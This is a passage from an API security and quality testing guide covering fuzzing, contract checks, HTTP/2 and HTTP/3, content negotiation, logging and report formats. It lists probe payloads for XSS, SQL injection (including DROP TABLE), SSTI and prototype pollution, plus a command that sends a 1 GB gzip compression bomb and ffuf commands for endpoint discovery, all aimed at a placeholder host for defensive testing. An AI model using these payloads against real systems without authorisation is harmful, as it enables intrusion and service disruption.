oasdiff breaking old-spec.yaml new-spec.yaml

# Classification:
# Breaking: field removed, type changed, required field added to request, status code changed
# Non-breaking: optional field added to response, new endpoint added

# Run in CI on every PR that touches API code or spec
```

### Schema drift detection (live)

```bash
# Schemathesis — property-based testing from OAS spec
schemathesis run https://api.example.com/openapi.json \
  --checks all \
  --validate-schema true

# Dredd — spec-driven live testing
dredd api.yaml https://api.example.com

# Spectral — OAS quality linting (150+ rules)
spectral lint openapi.yaml --ruleset @stoplight/spectral-owasp-ruleset
```

### Consumer-driven contracts (Pact)

Key rules:

1. **Consumer defines contract first** — never let provider decide what consumer gets
2. **Use flexible matchers** — `like()` (type), `eachLike()` (array), `regex()` — never hardcode timestamps or generated IDs
3. **Provider states are idempotent** — `"user 123 exists"` must be reproducible
4. **`can-i-deploy` gate** — never deploy provider without verifying all consumer contracts pass
5. **Test field removal** — add a contract test that breaks if a required response field is removed

### Sunset headers on deprecated endpoints

```bash
curl -sI https://api.example.com/v1/deprecated-endpoint | grep -i sunset
# Expected:
# Sunset: Sat, 01 Jan 2027 00:00:00 GMT
# Link: </v2/replacement>; rel="successor-version"
```

---

## Check 15 — API fuzzing

### Mutation-based fuzzing targets

Test every input field with:

```
# Numeric boundaries
0, -1, 2147483647 (MAX_INT), 2147483648 (overflow), -2147483648, NaN, Infinity

# String edge cases
""  "   "  "\x00"  "\n"  "\r\n"          # empty, whitespace, null byte, newlines
"<script>alert(1)</script>"              # XSS probe
"'; DROP TABLE users; --"               # SQL
"{{7*7}}"  "${7*7}"  "<%= 7*7 %>"      # SSTI
"A" * 10000                             # very long string
"​‌‍"                    # Unicode zero-width chars
"日本語テスト"  "مرحبا"                  # multibyte Unicode

# Array/object edge cases
[]                                      # empty array
[null, null, null]                      # null elements
{"__proto__": {"admin": true}}          # prototype pollution
deeply nested: {"a":{"a":{"a": ...}}}  # nesting bomb

# Content-Type confusion
# Send JSON body with Content-Type: text/plain
# Send XML body to JSON endpoint
# Omit Content-Type entirely on POST
```

### Generation-based fuzzing (Schemathesis)

```bash
# Runs property-based tests generated from OAS spec
schemathesis run https://api.example.com/openapi.json \
  --checks all \
  --hypothesis-max-examples 100 \
  --auth "Bearer $TOKEN"

# Stateful: links requests by response values
schemathesis run https://api.example.com/openapi.json \
  --stateful=links
```

### Stateful fuzzing (RESTler)

```bash
# RESTler infers producer-consumer relationships from OAS spec
# POST /users → creates user → GET /users/{id} uses that ID
# Fuzzes multi-step workflows, not just individual endpoints
restler-fuzzer compile --api_spec openapi.json
restler-fuzzer fuzz-lean --grammar_file grammar.py --target_ip api.example.com --target_port 443
```

### Endpoint discovery fuzzing

```bash
# ffuf — find undocumented endpoints
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://api.example.com/FUZZ \
     -mc 200,201,204,401,403

# Find shadow API versions
ffuf -w versions.txt -u https://api.example.com/FUZZ/users
# versions.txt: v1 v2 v3 api/v1 api/v2 ...
```

---

## Check 16 — HTTP/2 & HTTP/3

### HTTP/2

```bash
# Verify HTTP/2 is active
curl -sI --http2 https://api.example.com/ | grep HTTP

# HTTP/2 Rapid Reset (CVE-2023-44487) mitigation
# Attack: open stream, immediately RST, repeat rapidly — exhausts server without processing requests
# Mitigation: server must implement RST_STREAM flood protection
# Test: verify server is patched (check vendor advisory for version)

# 0-RTT replay (TLS 1.3 Early Data)
# Only idempotent GET requests should use 0-RTT
# POST/PUT/DELETE must not — they can be replayed by a network attacker
# Check: server sets Max-Early-Data: 0 on state-changing endpoints
```

### HTTP/3 / QUIC

```bash
# Verify HTTP/3 support
curl -sI --http3 https://api.example.com/ | head -5

# Alt-Svc header presence
curl -sI https://api.example.com/ | grep alt-svc
# Expected: alt-svc: h3=":443"; ma=86400

# Fallback when UDP blocked
# Expected: graceful fallback to HTTP/2 (QUIC uses UDP/443)
# Many corporate networks block UDP — verify API works without HTTP/3

# TLS 1.3 required for HTTP/3
# Verify certificate chain and OCSP stapling
curl -sI https://api.example.com/ | grep OCSP
```

---

## Check 17 — Content negotiation & encoding

```bash
# Content-Type enforcement
curl -X POST https://api.example.com/users \
     -H "Content-Type: text/plain" \
     -d '{"email":"a@b.com"}'
# Expected: 415 Unsupported Media Type

# Accept header
curl -H "Accept: application/xml" https://api.example.com/users
# Expected: 406 Not Acceptable (for JSON-only APIs)

# Compression bomb
# Send gzip body that decompresses to 1GB
python3 -c "import gzip, sys; sys.stdout.buffer.write(gzip.compress(b'A'*1073741824))" | \
  curl -X POST -H "Content-Encoding: gzip" -H "Content-Type: application/json" \
       --data-binary @- https://api.example.com/data
# Expected: 413 or 400 — not server OOM

# Charset handling
# UTF-8 multibyte: "日本語テスト"
# Null bytes: "\x00" in string fields
# Emoji: "Test 🔥" in name fields
# Expected: handled correctly, not database error or truncation

# Missing Content-Type on POST
curl -X POST https://api.example.com/users -d '{"email":"a@b.com"}'
# Expected: 400 or 415 — not 500
```

---

## Check 18 — Observability & logging quality

### Correlation ID end-to-end

```bash
curl -sI -H "X-Request-ID: test-trace-abc123" https://api.example.com/users
# Expected: X-Request-ID: test-trace-abc123 echoed in response
# Verify same ID appears in all downstream service logs for that request
```

### No secrets in logs

Scan application logs after making authenticated requests:

```bash
# Verify Authorization header value does NOT appear in log output
# Verify api_key, password, token values do NOT appear in debug logs
grep -i "authorization\|bearer\|api.key\|password" /var/log/app.log
# Expected: 0 matches (even at debug log level)
```

### Access log completeness

Every request must produce a log entry with:

```
timestamp  method  path  status  duration_ms  user_id  request_bytes  response_bytes
```

Verify: no requests silently missing from logs (can correlate with client-side request count).

### Structured log format

```bash
# Logs must be JSON (or structured) — not free-form text
tail -1 /var/log/app.log | python3 -m json.tool
# Expected: valid JSON — not "2026-05-23 GET /users 200 45ms"
```

### Distributed trace propagation

```bash
# Inject W3C traceparent header
curl -H "traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01" \
     https://api.example.com/orders
# Verify the trace ID appears in all downstream service spans in the tracing backend
```

### SLO alert verification

Under load test: verify monitoring alerts fire BEFORE p99 exceeds the SLO threshold — not after.

---

## Commonly missed edge cases

| Check | Why it is missed |
|-------|-----------------|
| `HEAD` and `OPTIONS` method testing | Most test suites only test GET/POST/PUT/DELETE |
| Concurrent duplicate POST requests (race condition) | Manual testing is serial |
| Unicode normalization (NFC vs NFD) in auth checks | Can bypass access control comparisons |
| Pagination with concurrent mutations | Page 2 content changes if records added/deleted between page 1 and page 2 |
| Prototype pollution (`__proto__`) | Only affects Node.js + certain libraries; easily overlooked |
| `X-HTTP-Method-Override: DELETE` bypass | Tunnels DELETE through POST — bypasses method-based ACL |
| API key in git history | `git log -S "sk-live"` — keys committed even once are compromised |
| `null` origin in CORS | `Origin: null` must not receive `Access-Control-Allow-Origin: null` for credentialed requests |
| Timezone edge cases in time-range queries | Usually tested with "normal" dates only |
| JWT in localStorage (XSS-stealable) | Frontend decision, but API team must flag it |
| Token revocation after logout | Stateless JWTs often skip server-side revocation entirely |

---

## Defect format

```md
### API-DEFECT-<number>: <title>

Severity:
<Critical / High / Medium / Low>

Endpoint:
<METHOD /path>

Check category:
<correctness | auth | jwt-attack | oauth2 | idor | mass-assignment | rate-limiting |
 rate-limit-bypass | cors | security-headers | ssrf | injection | xxe | ssti |
 prototype-pollution | method-override | graphql | grpc | webhook | performance |
 load-testing | payload | response-quality | url-structure | versioning | contract |
 schema-drift | fuzzing | http2-http3 | content-negotiation | observability | idempotency>

Steps to reproduce:
1. ...

Expected:
...

Actual:
...

Evidence:
- Request / response snippet
- curl command that demonstrates the issue

Likely cause:
...

Recommendation:
...
```

## Severity definitions

**Critical:**
- IDOR confirmed (access to another user's data)
- Auth bypass (protected endpoint reachable without token)
- SQL/NoSQL injection confirmed
- Mass assignment of privileged fields (role, admin, balance)
- Secret in URL (token, API key in query string)
- SSRF confirmed
- JWT algorithm confusion

**High:**
- No rate limiting on auth endpoints (brute force possible)
- CORS misconfiguration (reflects arbitrary origin)
- Excessive data exposure (hashed passwords, internal IDs in response)
- Verbose error leaking DB schema or stack trace
- Debug/admin endpoints accessible in production
- No API versioning on public API
- Missing HTTPS enforcement

**Medium:**
- Wrong HTTP status codes (200 for errors, 400 for 404)
- Inconsistent error response shape
- No compression on large responses
- No pagination on unbounded list endpoint
- Missing `Cache-Control` on public read endpoints
- Trailing slash inconsistency causing 404s
- Query param naming inconsistency

**Low:**
- Non-RESTful URL naming (verbs in path)
- Inconsistent date formats in response
- Mixed camelCase/snake_case in JSON keys
- Missing `Content-Type` response header
- Minor response field inconsistency

---

## Final report format

```md
# API Deep QA Report

Target:
<base URL>

Date:
<date>

API type:
<REST / GraphQL / gRPC>

Framework:
<Express / FastAPI / Rails / NestJS / Spring Boot / unknown>

Auth mechanism:
<Bearer JWT / API key / session / OAuth2 / none detected>

OpenAPI spec:
<present / absent>

Source code available:
<yes / no>

Environment:
<local / staging / production>

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | N |
| High | N |
| Medium | N |
| Low | N |

---

## Defects

[DEFECT LIST]

---

## Not tested / Coverage gaps

- [List checks skipped and why]

---

## Top recommendations (priority order)

1. [Most urgent fix]
2. ...
```
